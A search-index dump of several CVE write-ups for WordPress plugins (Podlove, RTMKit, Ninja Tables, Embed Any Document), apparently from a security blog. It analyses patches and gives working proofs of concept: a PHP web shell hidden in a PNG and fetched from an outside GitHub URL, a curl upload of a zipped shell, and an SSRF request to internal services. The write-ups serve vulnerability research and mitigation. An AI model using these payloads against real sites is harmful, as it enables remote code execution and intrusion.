file\"] D --\u003e E[\"is_image() check\"] E -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"] F --\u003e G[\"File accessible → possible RCE\"] E -- fail --\u003e H[\"Delete temp file → stop\"] graph TD A[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"] B --\u003e C[\"hex2str() → $source_url → new Image(...)\"] C --\u003e D[\"download_source() → download_url() → temporary file\"] D --\u003e E[\"is_image() check\"] E -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"] F --\u003e G[\"File accessible → possible RCE\"] E -- fail --\u003e H[\"Delete temp file → stop\"] graph TD A[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"] B --\u003e C[\"hex2str() → $source_url → new Image(...)\"] C --\u003e D[\"download_source() → download_url() → temporary file\"] D --\u003e E[\"is_image() check\"] E -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"] F --\u003e G[\"File accessible → possible RCE\"] E -- fail --\u003e H[\"Delete temp file → stop\"] ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Inject a \u003cphp\u003e tag into an image file and rename the file to .php echo '\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e' \u003e\u003e rce.png mv rce.png rce.php ❯ cat rce.php �PNG ␦ IHD��Ud�tEXtSoftwaregnome-screenshot��\u003e-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM +075����IDATH���A � ��GHI��l��l�˅��K�n�D �H)���a:kooܲ\u003c`�u�o� �{�3�9�1�~�� �9����P�1����R�!D\u003eLk���FT�r�|�Ru�� u��o'�`��?�!\"�� 2k���IEND�B`�\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Host the file somewhere on the internet on a domain different from the WordPress site, for example: https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php Hex-encode the URL (https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php) ❯ echo -n \"https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php\" | xxd -p 68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870 Send a GET request with param podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870 File uploaded successfully Access the created file and achieve RCE RCE via uploaded file Info 02/9acf743e6beb9c8e4395ee694d6504 as analyzed earlier is md5($url), then the directory structure first_2_characters/remaining_characters is created from that md5() result ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in Podlove Podcast Publisher ≤ 4.2.6 allows arbitrary file upload due to missing file type validation in move_as_original_file(). An attacker can upload malicious files (e.g., .php) into: wp-content/cache/podlove/\u003cfirst2\u003e/\u003crest\u003e/, which can lead to Remote Code Execution (RCE) if the file is publicly accessible. ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway Root cause: weak MIME checking and no blocking of dangerous extensions. Patch (≥ 4.2.7): added validation using wp_check_filetype_and_ext() and a denylist. Mitigation: update the plugin, prevent PHP execution in the cache directory, and remove suspicious files. ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress Podlove Podcast Publisher Plugin \u003c= 4.2.6 is vulnerable to Arbitrary File Upload ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress RTMKit Plugin.","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info CVE ID: CVE-2025-62065 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.6.5 Patched Versions: 1.6.6 CVSS severity: Medium (9.9) Required Privilege: Contributor Product: WordPress RTMKit Plugin ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - RTMKit: 1.6.5 (vulnerable) and 1.6.6 (patched). Diff tool - Meld or any diff comparison tool to inspect and compare differences between the two versions. Elementor ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff template.php - v1.6.5 function rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('No file uploaded.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip files are allowed.'); } $upload_dir = wp_upload_dir(); // path on server $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); // public URL $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); if (!move_uploaded_file($file['tmp_name'], $tmpFilePath)) { wp_send_json_error('Failed to save temporary file.'); } $res = $this-\u003etemplate_extract($tmpFileUrl, $file['name'], true); // after done remove file if (file_exists($tmpFilePath)) unlink($tmpFilePath); if ($res) { wp_send_json_success('Template successfully uploaded and extracted.'); } else { wp_send_json_error($res); } } template.php - v1.6.5 function template_extract($url, $id, $return = false) { $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; $tempFile = wp_tempnam($url); $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; $response = wp_remote_get($url, ['timeout' =\u003e 300]); if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); $zip-\u003eextractTo($targetDir); $zip-\u003eclose(); unlink($tempFile); $option = get_option('rtm_template_installed', []); // Default to array if option not present if (!is_array($option)) { $option = []; // Ensure $option is an array } $option[$hashId] = [ 'template_id' =\u003e $id ]; update_option('rtm_template_installed', $option); // Save back to database if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } In the vulnerable version: No proper user capability check: it only calls check_ajax_referer() but does not verify capability (e.g., current_user_can) → a user with a valid nonce or a leaked nonce can still upload. Temporary file saved in the public uploads folder (wp_upload_dir()): $tmpFilePath is under uploads/ so it is accessible via a URL ($tmpFileUrl) while the file exists. Retrieves the file via the public URL before extraction: template_extract() uses wp_remote_get($tmpFileUrl) → depends on a public URL. Extracts directly into a public directory: extractTo($targetDir) into uploads/rometheme_template → if a .php file is placed, the webserver may execute it. No whitelist/deny for extensions: does not remove or reject executable files (.php, .phtml, .phar, .sh, .exe, …). No content check for embedded PHP: there is no step to scan for \u003c?php before saving. Temporary public exposure risk: because the temp file is public during processing, an attacker has time to access/set up payload before the file is unlinked. =\u003e High likelihood of RCE. template.php - v1.6.6 function rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('No File Uploaded.'); } if (! current_user_can('manage_options')) { wp_send_json_error( array('message' =\u003e 'Insufficient permissions'), 403 ); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip file allowed.'); } $upload_dir = wp_upload_dir(); // Safe directory (not directly in public uploads) $base_safe_dir = $upload_dir['basedir'] . '//rometheme_template/'; $tmp_dir = $base_safe_dir . 'tmp/'; if (! file_exists($tmp_dir)) { wp_mkdir_p($tmp_dir); // prevent php execution in this folder @file_put_contents( $base_safe_dir . '.htaccess', \"Options -Indexes \u003cFilesMatch \".(php|phtml|phar)$\"\u003e Deny from all\u003c/FilesMatch\u003e\" ); } // Create unique","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code In the vulnerable version, the handler accepts an uploaded file (expects .zip), saves it to the uploads/ folder, then calls template_extract() to fetch and extract it. Finally it removes the temp file and returns JSON success/fail. Specifically: check_ajax_referer('rtm_template_nonce', 'nonce') Helps protect against CSRF — ensures the AJAX request is valid and contains a nonce. Searching for rtm_template_nonce in the plugin folder shows: How the nonce with action rtm_template_nonce is created wp_localize_script() will print an inline \u003cscript\u003e into the page and in it declare a JS object variable. In this case, the object rkit_libs stores values logo_url, ajax_url, template_nonce. Tip Because the vulnerability is disclosed with Contributor privileges required, and Contributors can usually create posts, we try creating a post and accessing the rkit_libs object from the browser console to obtain the nonce. Info We edit the post using Elementor, because the plugin’s widgets are used in Elementor; the default editor does not include them. Get nonce from browser console Check $_FILES['file'] and extension: if (empty($_FILES['file'])) { wp_send_json_error('No file uploaded.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip files are allowed.'); } Ensures client sent a file and only allows .zip uploads. Determine temporary path and public URL $upload_dir = wp_upload_dir(); $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); Creates a temp filename inside the uploads directory and the access URL to that file, e.g.: $tmpFilePath = \"/var/www/html/wp-content/uploads/rtm_temp_filename.zip\" $tmpFileUrl = \"http://localhost/wp-content/uploads/rtm_temp_filename.zip\" move_uploaded_file($file['tmp_name'], $tmpFilePath) Moves the uploaded file from PHP temp into the defined temporary location. Call template_extract($tmpFileUrl, $file['name'], true) template.php - v1.6.5 function template_extract($url, $id, $return = false) { // Get WordPress upload dir and create template directory $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; // Create temporary file to download file from URL $tempFile = wp_tempnam($url); // Create hash ID for template $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; // Download file from URL $response = wp_remote_get($url, ['timeout' =\u003e 300]); // Check for errors during download if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } // Save the ZIP contents into temp file $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); // Open ZIP and extract into target directory $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); // Create dir if not exists $zip-\u003eextractTo($targetDir); // Extract to target dir $zip-\u003eclose(); unlink($tempFile); // Remove temp file // Update 'rtm_template_installed' option in database $option = get_option('rtm_template_installed', []); if (!is_array($option)) { $option = []; } $option[$hashId] = ['template_id' =\u003e $id]; update_option('rtm_template_installed', $option); // Return result if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } Info Here the file is not extracted directly (i.e., not allowing Zip Slip to place files outside target), so Zip Slip techniques to move files to higher directories are not applicable. The final files are saved under {wp_upload_dir}/rometheme_template/{hashId}/ Returns JSON rtm_handle_upload_template() is registered as the callback for the action hook: add_action('wp_ajax_rtm_handle_upload_template', [$this, 'rtm_handle_upload_template']); Meaning: When a user sends an AJAX request to wp-admin/admin-aj","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph LR; A[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"] B --\u003e C{is .zip extension} C --\u003e|True| D{\"check_ajax_referer()\"} C --\u003e|False| E[\"wp_send_json_error()\"] D --\u003e|True| F[\"template_extract()\"] D --\u003e|False| G[Return 401] F --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"] graph LR; A[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"] B --\u003e C{is .zip extension} C --\u003e|True| D{\"check_ajax_referer()\"} C --\u003e|False| E[\"wp_send_json_error()\"] D --\u003e|True| F[\"template_extract()\"] D --\u003e|False| G[Return 401] F --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"] graph LR; A[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"] B --\u003e C{is .zip extension} C --\u003e|True| D{\"check_ajax_referer()\"} C --\u003e|False| E[\"wp_send_json_error()\"] D --\u003e|True| F[\"template_extract()\"] D --\u003e|False| G[Return 401] F --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"] graph LR; A[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"] B --\u003e C{is .zip extension} C --\u003e|True| D{\"check_ajax_referer()\"} C --\u003e|False| E[\"wp_send_json_error()\"] D --\u003e|True| F[\"template_extract()\"] D --\u003e|False| G[Return 401] F --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"] ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Log in with a Contributor account Create a post and edit it using Elementor Retrieve rkit_libs.template_nonce to get the nonce Create a file for RCE \u003c?php system($_GET['cmd']) ?\u003e Zip the created file zip rce.zip rce.php Send the upload request curl -X POST \"http://localhost/wp-admin/admin-ajax.php\" \\ -b \"your_cookie\" \\ -F \"action=rtm_handle_upload_template\" \\ -F \"nonce=your_nonce\" \\ -F \"file=@rce.zip;filename=rce.zip;type=application/zip\" Access the uploaded file RCE via uploaded file Question I want to emphasize that although this file can be accessed directly, direct access is limited by the hashId, since WordPress by default does not allow directory listing. ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability is the chain: Arbitrary File Upload + temporary public file + uncontrolled extraction → risk of RCE. The patch (1.6.6) fixes this by checking capabilities, storing temporary files in a non-public location, whitelisting extensions, blocking traversal, and scanning content. ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Update to 1.6.6 immediately. If you cannot update: disable template upload or restrict it to admins only. Always store uploaded files in non-public locations, whitelist extensions, block path traversal and scan contents before extraction. ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Arbitrary File Upload WordPress RTMKit Plugin \u003c= 1.6.5 is vulnerable to Arbitrary File Upload ","date":"2025-11-04","objectID":"/posts/2025-11-04-cve-2025-62065/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/posts/2025-11-04-cve-2025-62065/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Tables Plugin.","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Ninja Tables – Easy Data Table Builder plugin for WordPress contains a Server-Side Request Forgery (SSRF) vulnerability in all versions up to and including 5.0.18, via the args[url] parameter. This vulnerability allows unauthenticated attackers to perform web requests to arbitrary locations originating from the web application, and can be used to query and modify information from internal services. CVE ID: CVE-2025-2940 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Ninja Tables Plugin ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Ninja Tables: 5.0.18 (vulnerable) and 5.0.19 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Per the CVE description, the notable location in the patch is the code handling args[url] — this is likely the root cause of the vulnerability since this parameter is used directly in the request flow. Precondition location causing the vulnerability In the patch, the exploitable code has been disabled (commented out with //). ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code Client.php - v5.0.18 public static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); $response = $client-\u003e{$requestMethod}('', $params); if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); }); } The registerAsyncRequestHandler() function registers and handles an async endpoint in WordPress — specifically via admin_post_nopriv_{action}, i.e., a hook that allows unauthenticated (nopriv) users to send requests. Specifically, the function processes as follows: Create a unique action name for the plugin $action = static::makeAsyncRequestAction(); protected static function makeAsyncRequestAction() { return 'wpf-async-request-' . sha1( App::config()-\u003eget('app.slug') // plugin name: ninja-tables ); } makeAsyncRequestAction() generates a unique identifier for the plugin by concatenating a fixed prefix (wpf-async-request-) with the SHA1 hash of the plugin name (app.slug). Since the plugin name is \"ninja-tables\", the resulting value will be: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 Register the action hook with an anonymous callback App::addAction(\"admin_post_nopriv_{$action}\", function() { ... }); When an HTTP request is sent to /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 the logic inside the anonymous function will be invoked. Retrieve the Request object instance from the App container and read two main parameters $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); Instantiate a Client object with the baseUrl taken from the request $client = Client::make($requestUrl); public static function make($baseUrl = '', $args = []) { $args['cookies'] = $args['cookies'] ?? []; $args['headers'] = $args['headers'] ?? []; $args['options'] = $args['options'] ?? []; return new static($baseUrl, $args); } Client::make() is responsible for creating and configuring a new Client instance used to manage and send HTTP requests. The $baseUrl value is passed directly from $requestUrl — i.e., the URL provided by the user in args.url. Collect all other parameters except action, args.url, args.method $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; Decode and extract the callback function from the request parameters $callback = static::getCallback($params); protected static function getCallback(\u0026$params) { $callback = unserialize(base64_decode($params['callback'])); unset($params['callback']); return $callback; } getCallback() is used to extract a callback function provided in the args.callback parameter of the request. Invoke the $requestMethod with $params $response = $client-\u003e{$requestMethod}('', $params); For example: if $requestMethod is POST =\u003e $response = $client-\u003ePOST('', $params) Error check and return if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); Question What happens if $requestMethod does not exist — i.e., $client calls a method that is not present in the Client class? In this case, PHP will automatically invoke the magic __call() method declared in the Client class. __call() is designed to handle calls to non-existing methods, allowing the Client to perform dynamic requests based on the invoked method name. Observing the Outline tab shows all methods, properties and functions in the file in order. Outline of Client.php Client.php - v5.0.18 public function __call($method, $args) { if ($method === 'download') { return $th","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"] B --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"] C --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"] D --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"] E --\u003e F[\"Response → callback → HTTP Response\"] graph TD A[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"] B --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"] C --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"] D --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"] E --\u003e F[\"Response → callback → HTTP Response\"] graph TD A[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"] B --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"] C --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"] D --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"] E --\u003e F[\"Response → callback → HTTP Response\"] graph TD A[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"] B --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"] C --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"] D --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"] E --\u003e F[\"Response → callback → HTTP Response\"] ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server Create a simple local service with Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/delete') def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send a POST request with the URL pointing to the local service: POST /wp-admin/admin-post.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Content-Type: application/x-www-form-urlencoded Content-Length: 146 Connection: close action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[url]=http://localhost:8001/delete?id=1\u0026args[method]=GET\u0026args[name]=Tokuda Result: GET request to local service ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The SSRF vulnerability in Ninja Tables ≤ 5.0.18 shows that the args[url] parameter provided by the client is used directly to perform server-side requests without validation, allowing an unauthenticated attacker to force the application to access arbitrary destinations. The patch in ≥ 5.0.19 removed the unsafe code and mitigated this attack vector. ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Upgrade immediately to 5.0.19 or later. Do not use client input directly as a request URL — validate/normalize before use. Implement allowlists for hosts/ports and block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, etc.). Avoid registering admin_post_nopriv_* endpoints for functions that perform outbound requests, or add proper permission/CSRF controls. ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress Ninja Tables Plugin \u003c= 5.0.18 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-03","objectID":"/posts/2025-11-03-cve-2025-2940/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/posts/2025-11-03-cve-2025-2940/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed Any Document Plugin.","date":"2025-11-02","objectID":"/posts/2025-11-02-cve-2025-1043/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/posts/2025-11-02-cve-2025-1043/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The “Embed Any Document – Embed PDF, Word, PowerPoint and Excel Files” plugin for WordPress contains a Server-Side Request Forgery (SSRF) vulnerability in all versions up to and including 2.7.5 via the 'embeddoc' shortcode. This vulnerability allows authenticated attackers with Contributor access or higher to make web requests to arbitrary destinations originating from the web application and can be used to query or modify information from internal services. CVE ID: CVE-2025-1043 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.7.5 Patched Versions: 2.7.6 CVSS severity: Low (4.9) 